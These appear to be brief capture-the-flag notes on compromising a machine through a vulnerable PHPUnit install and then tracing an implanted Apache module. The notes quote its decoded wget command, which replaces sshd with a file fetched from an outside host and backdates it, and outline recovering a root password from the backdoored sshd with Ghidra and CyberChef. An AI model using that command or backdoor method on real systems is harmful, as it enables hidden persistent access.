/www/vendor contained phpunit > vulnerable to CVE-2017-9841

writeup referenced /www/info/ but it literally isn't there

after getting user we check his email to see there is
a problem with the apache server

inside /usr/lib/apache2/modules there is a file mod_reader.so
this file was selected because it had been modified 
very recently as opposed to all other apache2 files which
were factory default

this file had a base64 string that translated out to:
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd

so now we know there is a file in /usr/sbin called sshd we 
need to look at.

analyzing sshd with ghidra there is an auth_password function
with a 31 byte backdoor array. By saving these values to a c
code file, arranging them in descending order and pushing 
them through 3 steps in CyberChef:
1.) Swap endianness using hex format at 31 byte size
2.) From Hex using space delimiter
3.) XOR 96 with standard scheme
we can get the root password. 

Note you will have to change the negative value by altering
ghidra's character representation.
